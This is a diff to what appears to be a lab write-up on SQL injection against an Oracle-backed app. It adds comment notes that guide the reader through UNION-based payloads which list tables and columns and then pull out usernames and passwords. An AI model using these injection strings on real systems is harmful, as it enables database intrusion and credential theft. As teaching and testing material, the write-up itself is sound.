@@ -37,6 +37,11 @@ I also select an invalid category so that only my output appears.
 ```sql
 SELECT * FROM someTable WHERE category='X' UNION SELECT table_name, null from all_tables--'`
 ```
+// 📝 USER_"CAN_BE_DIFFERENT_EACH_TIME" – JUST LOOK FOR "USER_" THAT’S THE USER TABLE
+
+// 📝 TAKE NOTE OF THE USER_NAME TABLE
+
+
 
 ![name of the users table](img/found_users_table.png)
 
@@ -44,13 +49,18 @@ SELECT * FROM someTable WHERE category='X' UNION SELECT table_name, null from al
 
 The [all_tab_columns](https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/ALL_TAB_COLUMNS.html#GUID-F218205C-7D76-4A83-8691-BFD2AD372B63)-table holds information about the columns of each table, specifically the `column_name` column. The proper string to inject is `' UNION SELECT column_name, null from all_tab_columns WHERE table_name = 'USERS_TOAEAL'--` to form this query
 
+// 📝 REPLACE TABLE NAME ACCORDINGLY
+
  ```sql
 SELECT * FROM someTable WHERE category='X' UNION SELECT column_name, null from all_tab_columns WHERE table_name = 'USERS_TOAEAL'--'`
 ```
+// 📝 NOTE DOWN THE USERNAME AND PASSWORD COLUMN NAMES YOU SEE
 
 ![username and password columns](img/username_and_password_columns.png)
 
 ### Enumerate all usernames and passwords
+
+// 📝 REPLACE USER, PASSWORD, AND TABLE NAME WITH THE ONES YOU FOUND ABOVE
 
 Now I have all information to obtain the required usernames and passwords. I inject `' UNION SELECT USERNAME_DINZLR, PASSWORD_BTNGGB from USERS_TOAEAL--` to form this query:
 
